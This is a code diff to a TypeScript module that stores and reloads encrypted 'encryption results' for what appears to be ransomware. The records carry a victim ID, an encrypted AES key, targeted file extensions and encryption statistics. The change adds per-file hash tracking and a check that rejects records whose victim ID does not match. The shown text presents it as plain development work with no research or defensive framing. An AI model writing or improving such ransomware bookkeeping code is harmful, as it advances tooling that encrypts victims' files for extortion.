@@ -15,6 +15,7 @@ export interface EncryptionResults {
         targetExtensions: string[];
         timestamp: Date;
     };
+    fileHashes?: Map<string, string>; // Optional: Add fileHashes to the interface
 }
 
 // File name where results will be stored
@@ -40,6 +41,8 @@ export function saveEncryptionResults(
         const serializableResults = {
             ...results,
             encryptedAESKey: results.encryptedAESKey.toString('base64'),
+            // Serialize Map to object if fileHashes exists
+            fileHashes: results.fileHashes ? Object.fromEntries(results.fileHashes) : undefined,
         };
 
         // Convert to JSON string
@@ -89,7 +92,7 @@ export function loadEncryptionResults(
     victimId?: string
 ): EncryptionResults {
     try {
-        // Determine correct file path
+        // Determine the actual file path
         let resultPath: string;
         
         // If the path is a directory, look for the results file
@@ -122,19 +125,22 @@ export function loadEncryptionResults(
         decrypted += decipher.final('utf8');
         
         // Parse the JSON string back to an object
-        const jsonResults = JSON.parse(decrypted);
-        
-        // Convert the base64 AES key back to Buffer
-        const results: EncryptionResults = {
-            ...jsonResults,
-            encryptedAESKey: Buffer.from(jsonResults.encryptedAESKey, 'base64'),
-            encryptionStats: {
-                ...jsonResults.encryptionStats,
-                timestamp: new Date(jsonResults.encryptionStats.timestamp)
-            }
+        const parsedData = JSON.parse(decrypted) as any;
+
+        // Convert base64 AES key back to Buffer
+        const loadedResults: EncryptionResults = {
+            ...parsedData,
+            encryptedAESKey: Buffer.from(parsedData.encryptedAESKey, 'base64'),
+            // Deserialize object to Map if fileHashes exists
+            fileHashes: parsedData.fileHashes ? new Map(Object.entries(parsedData.fileHashes)) : undefined,
         };
         
-        return results;
+        // Verify victimId if provided
+        if (victimId && loadedResults.victimId !== victimId) {
+            throw new Error('Victim ID mismatch after decryption.');
+        }
+        
+        return loadedResults;
     } catch (error) {
         console.error('Error loading encryption results:', error);
         throw new Error(`Failed to load encryption results: ${error}`);
